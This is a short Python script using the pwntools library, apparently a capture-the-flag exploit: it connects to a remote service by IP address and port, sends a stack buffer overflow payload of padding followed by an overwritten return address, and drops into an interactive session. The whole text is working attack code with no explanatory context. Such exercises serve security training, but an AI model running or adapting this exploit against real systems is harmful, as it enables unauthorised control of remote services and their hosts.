from pwn import *

r=remote("118.178.181.26",4003)

r.recvuntil("n")

addr=0xAAF

payload=(0x10+0x8)*"a"+p64(addr)

r.sendline(payload)

r.interactive()
